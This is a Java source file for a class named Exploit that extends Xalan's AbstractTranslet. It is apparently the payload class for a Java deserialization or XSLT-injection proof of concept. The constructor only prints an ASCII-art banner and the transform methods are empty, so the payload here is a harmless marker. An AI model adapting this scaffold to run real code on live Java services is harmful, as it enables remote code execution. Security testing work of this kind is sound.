

import java.util.Properties;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class Exploit extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

    public Exploit() throws Exception {
        super.transletVersion = CURRENT_TRANSLET_VERSION;

        System.err.println("███████╗ ██████╗ ████████╗ ██████╗ ███╗   ███╗ █████╗ ██╗   ██╗ ██████╗ ██████╗  ██╗██╗██╗");     
        System.err.println("██╔════╝██╔═══██╗╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚██╗ ██╔╝██╔═══██╗██╔══██╗ ██║██║██║");    
        System.err.println("███████╗██║   ██║   ██║   ██║   ██║██╔████╔██║███████║ ╚████╔╝ ██║   ██║██████╔╝ ██║██║██║");    
        System.err.println("╚════██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║  ╚██╔╝  ██║   ██║██╔══██╗ ╚═╝╚═╝╚═╝");    
        System.err.println("███████║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║  ██║ ██╗██╗██╗");    
        System.err.println("╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═╝╚═╝╚═╝");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    }
}
